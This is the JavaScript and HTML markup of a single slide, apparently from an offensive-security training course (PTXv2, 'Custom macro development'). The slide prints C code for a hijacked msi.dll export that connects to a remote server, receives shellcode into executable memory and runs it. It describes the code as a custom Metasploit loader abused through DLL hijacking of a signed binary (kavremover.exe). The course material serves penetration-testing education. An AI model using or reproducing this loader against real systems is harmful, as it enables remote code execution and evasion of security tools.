(function(){var loadHandler=window['sl_{D8C1971F-D8E7-4ADE-AF2A-E4D7C02A081C}'];loadHandler&&loadHandler(75, '<div id="spr0_24d20c5"><div id="spr1_24d20c5" class="kern slide"><img id="img0_24d20c5" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg11_24d20c5" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_24d20c5" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;"><span id="txt0_24d20c5" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg12_24d20c5" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_24d20c5" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;"><span id="txt1_24d20c5" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl4_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;" style="left:905.096px;top:313.837px;"><div id="svg13_24d20c5" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr5_24d20c5" style="left:905.096px;top:313.837px;"><div style="width:0px;"><a id="hl5_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;"><span id="txt2_24d20c5" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr6_24d20c5" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt3_24d20c5" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 1, Module 1 - Caendra Inc. © 2020</span></div></div><a id="hl6_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;" style="left:905.732px;top:360.719px;"><div id="svg14_24d20c5" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_24d20c5" style="left:905.732px;top:360.719px;"><div style="width:0px;"><a id="hl7_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;"><span id="txt4_24d20c5" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="svg15_24d20c5" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl8_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg18_24d20c5" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr8_24d20c5" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl9_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;"><span id="txt5_24d20c5" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl10_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg19_24d20c5" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr9_24d20c5" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl11_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;"><span id="txt6_24d20c5" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl12_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;" style="left:905.096px;top:313.837px;"><div id="svg20_24d20c5" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr10_24d20c5" style="left:905.096px;top:313.837px;"><div style="width:0px;"><a id="hl13_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;"><span id="txt7_24d20c5" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl14_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;" style="left:905.732px;top:360.719px;"><div id="svg21_24d20c5" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr11_24d20c5" style="left:905.732px;top:360.719px;"><div style="width:0px;"><a id="hl15_24d20c5" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;"><span id="txt8_24d20c5" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_24d20c5" class="kern slide"><div id="svg22_24d20c5" style="left:34.833px;top:155.49px;"><svg width="567" height="342" viewBox="0 0 567 342"><path fill="#000000" d="M0,0 h566.125 v341.307 h-566.125 Z"/></svg></div><div id="spr12_24d20c5" style="left:34.833px;top:155.49px;"><div style="width:0px;"><span id="txt9_24d20c5" class="nokern" data-width="334.779724" style="left:9.6px;top:6.194px;">int MsiGetProductInfoA(int argc, char * argv[]) {</span></div><div style="width:0px;"><span id="txt10_24d20c5" class="nokern" data-width="109.315826" style="left:9.6px;top:22.394px;">  FreeConsole();</span></div><div style="width:0px;"><span id="txt11_24d20c5" class="nokern" data-width="116.148071" style="left:9.6px;top:38.794px;">    ULONG32 size;</span></div><div style="width:0px;"><span id="txt12_24d20c5" class="nokern" data-width="122.980309" style="left:9.6px;top:55.194px;">    char * buffer;</span></div><div style="width:0px;"><span id="txt13_24d20c5" class="nokern" data-width="157.141510" style="left:9.6px;top:71.594px;">    void (*function)();</span></div><div style="width:0px;"><span id="txt14_24d20c5" class="nokern" data-width="129.812546" style="left:9.6px;top:87.994px;">    winsock_init();</span></div><div style="width:0px;"><span id="txt15_24d20c5" class="nokern" data-width="382.605408" style="left:9.6px;top:104.394px;">    SOCKET my_socket = wsconnect(server, atoi(serverp));</span></div><div style="width:0px;"><span id="txt16_24d20c5" class="nokern" data-width="362.108673" style="left:9.6px;top:120.794px;">    int count = recv(my_socket, (char *)&amp;size, 4, 0);</span></div><div style="width:0px;"><span id="txt17_24d20c5" class="nokern" data-width="218.631653" style="left:9.6px;top:137.194px;">    if (count != 4 || size &lt;= 0)</span></div><div style="width:0px;"><span id="txt18_24d20c5" class="nokern" data-width="286.954041" style="left:9.6px;top:153.594px;">        punt(my_socket, &quot;error lenght\\n&quot;);</span></div><div style="width:0px;"><span id="txt19_24d20c5" class="nokern" data-width="512.417969" style="left:9.6px;top:169.994px;">    buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></div><div style="width:0px;"><span id="txt20_24d20c5" class="nokern" data-width="157.141510" style="left:9.6px;top:186.394px;">    if (buffer == NULL)</span></div><div style="width:0px;"><span id="txt21_24d20c5" class="nokern" data-width="286.954041" style="left:9.6px;top:202.794px;">        punt(my_socket, &quot;error in buf\\n&quot;);</span></div><div style="width:0px;"><span id="txt22_24d20c5" class="nokern" data-width="143.477020" style="left:9.6px;top:219.194px;">    buffer[0] = 0xBF;</span></div><div style="width:0px;"><span id="txt23_24d20c5" class="nokern" data-width="259.625092" style="left:9.6px;top:235.594px;">    memcpy(buffer + 1, &amp;my_socket, 4);</span></div><div style="width:0px;"><span id="txt24_24d20c5" class="nokern" data-width="341.611969" style="left:9.6px;top:251.994px;">    count = recv_all(my_socket, buffer + 5, size);</span></div><div style="width:0px;"><span id="txt25_24d20c5" class="nokern" data-width="232.296143" style="left:9.6px;top:268.394px;">    function = (void (*)())buffer;</span></div><div style="width:0px;"><span id="txt26_24d20c5" class="nokern" data-width="102.483589" style="left:9.6px;top:284.794px;">    function();</span></div><div style="width:0px;"><span id="txt27_24d20c5" class="nokern" data-width="88.819115" style="left:9.6px;top:301.194px;">    return 0;</span></div><div style="width:0px;"><span id="txt28_24d20c5" class="nokern" style="left:9.6px;top:317.594px;">}</span></div></div><div id="spr13_24d20c5" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt29_24d20c5" data-width="589.572266" style="left:9.6px;top:27.438px;">1.3.1 Custom macro development</span></div></div><div id="svg23_24d20c5" style="left:630.707px;top:254.563px;"><svg width="243" height="97" viewBox="-0.167 -0.167 243 97"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" d="M0.167,0.167 h242.074 v95.805 h-242.074 Z"/></svg></div><div id="spr14_24d20c5" style="left:630.874px;top:254.729px;"><div style="width:0px;"><span id="txt30_24d20c5" class="nokern" data-width="193.122269" style="left:9.767px;top:3.167px;">There are two functions in msi.dll</span></div><div style="width:0px;"><span id="txt31_24d20c5" class="nokern" data-width="204.441589" style="left:9.767px;top:20.22px;">(kavremover.exe’s DLL that is being</span></div><div style="width:0px;"><span id="txt32_24d20c5" class="nokern" data-width="194.315979" style="left:9.767px;top:37.273px;">searched during execution) called</span></div><div style="width:0px;"><span id="txt33_24d20c5" class="nokern relpos" data-width="47.773457" style="left:9.767px;top:54.327px;">GetInfo</span><span id="txt34_24d20c5" class="nokern relpos" data-width="28.169882" style="left:9.76px;top:54.327px;"> and </span><span id="txt35_24d20c5" class="nokern relpos" data-width="121.741081" style="left:9.753px;top:54.327px;">MsiGetProductInfoA</span><span id="txt36_24d20c5" class="nokern relpos" data-width="26.518137" style="left:9.747px;top:54.327px;">. We</span></div><div style="width:0px;"><span id="txt37_24d20c5" class="nokern relpos" data-width="44.312565" style="left:9.767px;top:71.38px;">choose </span><span id="txt38_24d20c5" class="nokern relpos" data-width="121.741081" style="left:9.76px;top:71.38px;">MsiGetProductInfoA</span><span id="txt39_24d20c5" class="nokern relpos" style="left:9.753px;top:71.38px;">.</span></div></div><div id="svg10_24d20c5" style="left:184.105px;top:175.456px;"><svg width="448" height="129" viewBox="-0.926 -2.119 448 129"><g fill="none"><g transform="translate(0.133484,1.70577)"><g fill="#0070c0" stroke="none" transform="translate(-0.133484,-1.70578)"><path stroke="#0070c0" stroke-width="1" stroke-linecap="butt" transform="translate(0.133484,1.70578)" d="M445.876,123.518 L6.885,1.907"/><path transform="matrix(-0.963705,-0.266968,0.266968,-0.963705,446.009918,125.223389)" d="M462.669,0 L454.731,3.969 V-3.969 Z"/></g></g></g></svg></div><div id="spr15_24d20c5" style="left:832px;top:502px;"><div style="width:0px;"><span id="txt40_24d20c5" class="nokern" data-width="40.013020" style="left:9.6px;top:7.998px;">|   p.76</span></div></div><div id="spr16_24d20c5" style="left:34.833px;top:111.906px;"><div style="width:0px;"><span id="txt41_24d20c5" data-width="693.723938" style="left:9.6px;top:5.788px;">RTF + Signed binary + DLL hijacking + Custom MSF loader</span></div></div></div></div>');})();